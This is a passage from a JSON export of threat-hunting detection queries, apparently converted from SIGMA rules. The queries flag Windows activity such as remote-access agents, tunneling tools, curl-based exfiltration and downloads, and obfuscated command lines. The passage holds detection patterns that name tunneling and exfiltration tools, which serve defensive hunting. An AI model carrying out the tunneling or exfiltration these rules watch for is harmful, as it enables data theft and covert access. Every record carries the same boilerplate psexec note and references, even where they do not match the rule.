            "name": "Remote Access Tool - Ammy Admin Agent Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\rundll32.exe\" and tgt.process.cmdline contains \"AMMYY\\aa_nts.dll\\\",run\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 671
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of well known tools that can be abused for data exfiltration and tunneling.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1041",
                "t1572",
                "t1071"
            ],
            "name": "Tunneling Tool Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\httptunnel.exe\" or tgt.process.image.path contains \"\\plink.exe\" or tgt.process.image.path contains \"\\socat.exe\" or tgt.process.image.path contains \"\\stunnel.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 672
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects child processes of \"dfsvc\" which indicates a ClickOnce deployment execution.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "ClickOnce Deployment Execution - Dfsvc.EXE Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\dfsvc.exe\" and tgt.process.image.path contains \"\\AppData\\Local\\Apps\\2.0\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 673
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential CommandLine obfuscation using unicode characters.\nAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "Potential CommandLine Obfuscation Using Unicode Characters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\u02e3\" or tgt.process.cmdline contains \"\u02ea\" or tgt.process.cmdline contains \"\u02e2\" or tgt.process.cmdline contains \"\u2215\" or tgt.process.cmdline contains \"\u2044\" or tgt.process.cmdline contains \"\u2015\" or tgt.process.cmdline contains \"\u2014\" or tgt.process.cmdline contains \"\u00a0\" or tgt.process.cmdline contains \"\u00af\" or tgt.process.cmdline contains \"\u00ae\" or tgt.process.cmdline contains \"\u00b6\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 674
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects any child process spawning from \"Diskshadow.exe\". This could be due to executing Diskshadow in interpreter mode or script mode and using the \"exec\" flag to launch other applications.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Diskshadow Child Process Spawned",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\diskshadow.exe\" and (not tgt.process.image.path contains \":\\Windows\\System32\\WerFault.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 675
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes spawned by PowerShell.\nUse this rule to hunt for potential anomalies initiating from PowerShell scripts and commands.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Potentially Suspicious PowerShell Child Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\powershell_ise.exe\" or src.process.image.path contains \"\\powershell.exe\" or src.process.image.path contains \"\\pwsh.exe\") and (tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\hh.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\scrcons.exe\" or tgt.process.image.path contains \"\\scriptrunner.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\")) and (not ((tgt.process.image.path contains \"\\certutil.exe\" and tgt.process.cmdline contains \"-verifystore \") or (tgt.process.image.path contains \"\\wmic.exe\" and (tgt.process.cmdline contains \"qfe list\" or tgt.process.cmdline contains \"diskdrive \" or tgt.process.cmdline contains \"csproduct \" or tgt.process.cmdline contains \"computersystem \" or tgt.process.cmdline contains \" os \" or tgt.process.cmdline contains \"\")))) and (not (src.process.cmdline contains \"\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\\" and tgt.process.cmdline contains \"\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 676
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of \"schtasks.exe\" from a parent that is located in a potentially suspicious location.\nMultiple malware strains were seen exhibiting a similar behavior in order to achieve persistence.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Scheduled Task Creation From Potential Suspicious Parent Location",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \":\\Temp\\\" or src.process.image.path contains \"\\AppData\\Local\\\" or src.process.image.path contains \"\\AppData\\Roaming\\\" or src.process.image.path contains \"\\Temporary Internet\" or src.process.image.path contains \"\\Users\\Public\\\" or src.process.image.path contains \"\\Windows\\Temp\\\") and tgt.process.image.path contains \"\\schtasks.exe\" and tgt.process.cmdline contains \"/Create \") and (not (tgt.process.cmdline contains \"update_task.xml\" or tgt.process.cmdline contains \"unattended.ini\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 677
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a program executing from a web server root folder. Use this rule to hunt for potential interesting activity such as webshell or backdoors\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505"
            ],
            "name": "Execution From Webserver Root Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\wwwroot\\\" or tgt.process.image.path contains \"\\wmpub\\\" or tgt.process.image.path contains \"\\htdocs\\\") and (not ((tgt.process.image.path contains \"bin\\\" or tgt.process.image.path contains \"\\Tools\\\" or tgt.process.image.path contains \"\\SMSComponent\\\") and src.process.image.path contains \"\\services.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 678
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of Action1 in order to execute arbitrary code or establish a remote session.\n\nAction1 is a powerful Remote Monitoring and Management tool that enables users to execute commands, scripts, and binaries.\nThrough the web interface of action1, the administrator must create a new policy or an app to establish remote execution and then points that the agent is installed.\n\nHunting Opportunity 1- Weed Out The Noise\n\nWhen threat actors execute a script, a command, or a binary through these new policies and apps, the names of these become visible in the command line during the execution process. Below is an example of the command line that contains the deployment of a binary through  a policy with name \"test_app_1\":\n\nParentCommandLine: \"C:\\WINDOWS\\Action1\\action1_agent.exe schedule:Deploy_App__test_app_1_1681327673425 runaction:0\"\n\nAfter establishing a baseline, we can split the command to extract the policy name and group all the policy names and inspect the results with a list of frequency occurrences.\n\nHunting Opportunity 2 - Remote Sessions On Out Of Office Hours\n\nIf you have admins within your environment using remote sessions to administer endpoints, you can create a threat-hunting query and modify the time of the initiated sessions looking for abnormal activity.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - Action1 Arbitrary Code Execution and Remote Sessions",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\action1_agent.exe\" and tgt.process.image.path contains \"\\Windows\\Action1\\package_downloads\\\") or ((src.process.image.path contains \"\\cmd.exe\" or src.process.image.path contains \"\\powershell.exe\") and (src.process.cmdline contains \"\\Action1\\scripts\\Run_Command_\" or src.process.cmdline contains \"\\Action1\\scripts\\Run_PowerShell_\")) or tgt.process.image.path contains \"\\agent1_remote.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 679
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the \"curl\" process with \"upload\" flags. Which might indicate potential data exfiltration",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1567",
                "t1105"
            ],
            "name": "Potential Data Exfiltration Via Curl.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\curl.exe\" or tgt.process.displayName=\"The curl executable\") and ((tgt.process.cmdline contains \" --form\" or tgt.process.cmdline contains \" --upload-file \" or tgt.process.cmdline contains \" --data \" or tgt.process.cmdline contains \" --data-\") or tgt.process.cmdline matches \"\\\\s-[FTd]\\\\s\")) and (not (tgt.process.cmdline contains \"://localhost\" or tgt.process.cmdline contains \"://127.0.0.1\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 680
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential suspicious execution of a GUID like folder name located in a suspicious location such as %TEMP% as seen being used in IcedID attacks.\nUse this rule to hunt for potentially suspicious activity stemming from uncommon folders.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "Potential Suspicious Execution From GUID Like Folder Names",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"\\AppData\\Roaming\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\") and (tgt.process.cmdline contains \"\\{\" and tgt.process.cmdline contains \"}\\\")) and (not ((tgt.process.image.path contains \"\\{\" and tgt.process.image.path contains \"}\\\") or not (tgt.process.image.path matches \"\\.*\") or tgt.process.image.path=\"C:\\Windows\\System32\\drvinst.exe\" or (tgt.process.image.path in (\"C:\\Windows\\System32\\msiexec.exe\",\"C:\\Windows\\SysWOW64\\msiexec.exe\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 681
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of curl.exe with custom useragent options",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071"
            ],
            "name": "Curl.EXE Execution With Custom UserAgent",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\curl.exe\" or tgt.process.displayName=\"The curl executable\") and (tgt.process.cmdline contains \" -A \" or tgt.process.cmdline contains \" --user-agent \"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 682
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of software that is related to the University of California, Berkeley via metadata information.\nThis indicates it may be related to BOINC software and can be used maliciously if unauthorized.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1553"
            ],
            "name": "Potential BOINC Software Execution (UC-Berkeley Signature)",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.displayName=\"University of California, Berkeley\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 683
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects remote binary or command execution via the ScreenConnect Service.\nUse this rule in order to hunt for potentially anomalous executions originating from ScreenConnect\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Remote Access Tool - ScreenConnect Remote Command Execution - Hunting",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\ScreenConnect.ClientService.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 684
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects file download using curl.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "File Download Via Curl.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\curl.exe\" or tgt.process.displayName=\"The curl executable\") and (tgt.process.cmdline contains \" -O\" or tgt.process.cmdline contains \"--remote-name\" or tgt.process.cmdline contains \"--output\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 685
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"csc.exe\" to compile .NET code. Attackers often leverage this to compile code on the fly and use it in other stages.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "Dynamic .NET Compilation Via Csc.EXE - Hunting",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\csc.exe\" and tgt.process.cmdline contains \"/noconfig /fullpaths @\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 686
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a curl process start on Windows, which could indicates a file download from a remote location or a simple web request to a remote server",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Curl.EXE Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\curl.exe\" or tgt.process.displayName=\"The curl executable\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
